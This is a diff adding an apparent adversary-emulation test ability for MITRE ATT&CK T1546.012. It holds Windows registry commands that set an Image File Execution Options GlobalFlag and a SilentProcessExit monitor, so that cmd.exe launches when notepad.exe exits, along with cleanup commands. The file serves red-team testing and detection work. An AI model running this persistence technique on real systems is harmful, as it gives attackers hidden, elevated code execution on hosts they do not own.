@@ -1,0 +1,18 @@
+- id: 70ca4ea4-5f35-52bd-8694-102c7c1f4c16
+  name: Soumaia ART Tests - IFEO Global Flags
+  description: Leverage Global Flags Settings (requires elevation)
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1546.012
+    name: 'Event Triggered Execution: Image File Execution Options Injection'
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
+          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
+          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\Windows\System32\cmd.exe"
+        cleanup: |-
+          reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /f >nul 2>&1
+          reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /f >nul 2>&1
+          reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /f >nul 2>&1
